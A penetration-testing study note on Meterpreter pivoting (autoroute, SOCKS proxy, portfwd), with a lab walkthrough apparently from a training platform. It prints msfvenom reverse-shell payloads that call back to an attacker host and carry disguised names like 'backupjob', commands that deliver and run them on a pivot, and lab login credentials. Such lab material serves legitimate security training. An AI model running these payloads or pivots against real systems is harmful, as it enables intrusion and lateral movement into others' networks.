# 05 — Meterpreter Tunneling & Port Forwarding

> Same pivoting goals as SSH, but entirely inside Metasploit — useful when you already have a Meterpreter session and don't want to drop to SSH.

---

## When to Use This vs SSH

| Approach | Use when |
|----------|----------|
| SSH `-D` / `-L` / `-R` | You have SSH creds/keys on the pivot |
| **Meterpreter + autoroute + socks_proxy** | You have a Meterpreter session and want SOCKS-level pivot without SSH |
| **Meterpreter portfwd** | You need to forward a single specific port (e.g., RDP 3389) cleanly |

Both approaches produce a SOCKS proxy on `127.0.0.1:9050` routed through the pivot — the tooling after that (proxychains, nmap, xfreerdp) is identical.

---

## Step 1 — Get a Meterpreter Session on the Pivot

Generate a Linux Meterpreter payload and deliver it to the pivot host:

```bash
# On attack box — generate ELF payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob

# Start the handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```

```bash
# On pivot host — execute payload
chmod +x backupjob && ./backupjob
```

Confirm session:

```
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826)
meterpreter > pwd
/home/ubuntu
```

---

## Step 2 — Discover the Internal Network

### Option A — Meterpreter ping sweep module

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

### Option B — Bash one-liner (on pivot, Linux)

```bash
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

### Option C — CMD one-liner (pivot is Windows)

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### Option D — PowerShell sweep

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

> Note: Run ping sweeps at least twice — ARP caches take time to build and early probes can silently drop.

---

## Step 3 — Add Routes with AutoRoute

AutoRoute tells Metasploit how to reach internal subnets via the Meterpreter session.

### Method A — Dedicated post module (preferred)

```bash
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

```
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
```

### Method B — From within the Meterpreter session

```bash
meterpreter > run autoroute -s 172.16.5.0/23
```

> The `-p` flag lists active routes:

```bash
meterpreter > run autoroute -p

Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.5.0         255.255.254.0      Session 1
```

---

## Step 4 — Start the SOCKS Proxy

```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```

Confirm it's running:

```bash
msf6 auxiliary(server/socks_proxy) > jobs
# Id  Name                           Payload  Payload opts
# 0   Auxiliary: server/socks_proxy
```

---

## Step 5 — Configure proxychains

Ensure `/etc/proxychains.conf` (or `/etc/proxychains4.conf` on Kali) has:

```
socks4  127.0.0.1 9050
```

> If your socks_proxy is running version `5`, change to `socks5`.

---

## Step 6 — Scan Through the Tunnel

```bash
# TCP connect scan only — no raw sockets through SOCKS
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

# Output confirms the chain
# |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
# 3389/tcp open  ms-wbt-server
```

---

## Meterpreter Port Forwarding (portfwd)

Use `portfwd` when you want to forward **a single specific port** directly — simpler and faster than the full SOCKS stack for known targets.

### portfwd options

```bash
meterpreter > help portfwd
# -l   local port to listen on (attack box)
# -L   local host to listen on (optional)
# -p   remote port to connect to
# -r   remote host to connect to
# -R   reverse port forward flag
```

### Forward port (attack box → internal target)

```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
# [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

Now `localhost:3300` on your attack box connects to `172.16.5.19:3389` through the pivot:

```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Verify with netstat:

```bash
netstat -antp | grep 3300
# tcp  0  0  127.0.0.1:54652  127.0.0.1:3300  ESTABLISHED  4075/xfreerdp
```

### Reverse port forward (internal target → attack box)

Used when you want a shell from a host deep inside the network to reach back to your attack box. The traffic flows:

`Windows target → Ubuntu pivot (port 1234) → attack box (port 8081)`

```bash
# 1. Add reverse forward rule in Meterpreter
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
# [*] Local TCP relay created: 10.10.14.18:8081 <-> :1234

# 2. Background session and start Windows handler
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > run

# 3. Generate Windows payload pointing at the PIVOT (not your attack box)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
```

The Windows target connects to the pivot on `1234`, the pivot relays it to your attack box on `8081`, and you catch a Meterpreter session.

---

## Full Workflow — Quick Reference

```bash
# 1. Generate + deliver Linux payload to pivot
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -f elf -o backupjob
# handler: use exploit/multi/handler → linux/x64/meterpreter/reverse_tcp → run

# 2. Discover internal network from session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# 3. Add routes
msf6 > use post/multi/manage/autoroute
#   set SESSION 1 → set SUBNET 172.16.5.0 → run

# 4. Start SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
#   set SRVPORT 9050 → set version 4a → run

# 5. Scan through tunnel
proxychains nmap 172.16.5.19 -p- -sT -Pn

# 6. Single-port forward (optional — skip SOCKS for known targets)
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
xfreerdp /v:localhost:3300 /u:USER /p:PASS
```

---

## Triage

| Symptom | Fix |
|---------|-----|
| autoroute warns "incompatible session platform" | Warning only — routes still add. Check with `run autoroute -p` |
| proxychains scan shows everything filtered/closed | Scan is unreliable; just try the actual service |
| socks_proxy job dies immediately | Check `msf6 > jobs` — may need `srvhost 0.0.0.0` not `127.0.0.1` |
| portfwd RDP connects but screen is blank | Add `/cert:ignore /dynamic-resolution` to xfreerdp |
| Reverse portfwd payload not connecting back | Ensure `LHOST` in msfvenom points to the **pivot's internal IP**, not your attack box |

---

## Key Takeaways

1. **autoroute + socks_proxy** = the Meterpreter equivalent of `ssh -D`. Same proxychains workflow after.
2. **portfwd** = the Meterpreter equivalent of `ssh -L` / `ssh -R`. Use it for a single known service instead of standing up a full SOCKS stack.
3. Ping sweeps may need two passes — ARP cache must build first.
4. `proxychains nmap` rules still apply: `-sT -Pn`, no raw socket scans.
5. For a reverse shell from a deep host: generate payload with `LHOST=PIVOT_INTERNAL_IP`, use `portfwd -R` to relay back to your attack box.

---

## Lab Solution — Section 5 Skills (May 8, 2026)

**Pivot host:** `10.129.91.231` (ACADEMY-PIVOTING-LINUXPIV)
**Pivot creds:** `ubuntu : HTB_@cademy_stdnt!`
**Internal target:** `172.16.5.19` (Windows)
**Internal creds:** `victor : pass@123`

### Q1 — What two IPs are discovered in the ping sweep? → `172.16.5.19,172.16.5.129`

172.16.5.129 is the pivot itself; 172.16.5.19 is the Windows target.

### Q2 — Which AutoRoute route makes 172.16.5.19 reachable? → `172.16.4.0/255.255.254.0`

The pivot's `ens224` is `172.16.5.129/23`. The /23 network base is `172.16.4.0` (not `172.16.5.0` as shown in the module example — AutoRoute reads the kernel routing table directly). Confirm with `route -n` on the pivot.

---

### Full Copy-Pastable Chain

**Step 0 — Confirm pivot interfaces and internal subnet**

```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 'ip -br a && route -n'
```

**Step 1 — Generate Linux Meterpreter payload (set LHOST to your tun0 IP)**

```bash
LHOST=$(ip -br a | grep tun0 | awk '{print $3}' | cut -d/ -f1)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=8080 -f elf -o /tmp/backupjob 2>/dev/null
echo "[*] Payload written to /tmp/backupjob — LHOST=$LHOST"
```

**Step 2 — Deliver payload to pivot**

```bash
sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no /tmp/backupjob ubuntu@10.129.91.231:/tmp/backupjob
```

**Step 3 — Start MSF handler (run this in msfconsole)**

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run -j
```

**Step 4 — Execute payload on pivot (separate terminal)**

```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 'chmod +x /tmp/backupjob && /tmp/backupjob &'
```

**Step 5 — Ping sweep from Meterpreter session**

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Or verify directly on the pivot:

```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 \
  'for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done; sleep 5'
```

**Step 6 — Add routes with AutoRoute**

```
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

Verify:

```
meterpreter > run autoroute -p
```

**Step 7 — Start SOCKS proxy**

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
```

**Step 8 — Ensure proxychains is configured (Kali uses proxychains4.conf)**

```bash
grep "socks" /etc/proxychains4.conf || echo "socks4  127.0.0.1 9050" | sudo tee -a /etc/proxychains4.conf
```

**Step 9 — Scan / interact through the tunnel**

```bash
# Port check
proxychains4 -q nmap -Pn -sT -n -p 3389,445,80 172.16.5.19

# RDP
proxychains4 xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore /dynamic-resolution

# SMB (faster than RDP for file access)
proxychains4 -q smbclient //172.16.5.19/C$ -U 'victor%pass@123' -c 'ls Users\victor\Desktop\'
```

### Lessons Learned

- The pivot's `/23` network base is `172.16.4.0`, **not** `172.16.5.0` — AutoRoute reports the true network base from the kernel routing table, which can differ from the module example diagrams.
- On Kali, proxychains config is `/etc/proxychains4.conf`, not `/etc/proxychains.conf` as the module references.
- `nmap -sT` through SOCKS may report ports as `filtered` even when they're open — always just try the service directly.
- SMB via proxychains is faster and more reliable than RDP over a tunnel for flag retrieval.
- Always confirm tun0 IP before generating payloads: `ip -br a | grep tun0`.

---

## References

- Previous: [04-Remote_Reverse_Port_Forwarding_with_SSH.md](04-Remote_Reverse_Port_Forwarding_with_SSH.md)
- Next: [06-DNS_Tunneling_with_Dnscat2.md](06-DNS_Tunneling_with_Dnscat2.md)
- Metasploit autoroute docs: `msf6 > info post/multi/manage/autoroute`
- Metasploit socks_proxy docs: `msf6 > info auxiliary/server/socks_proxy`
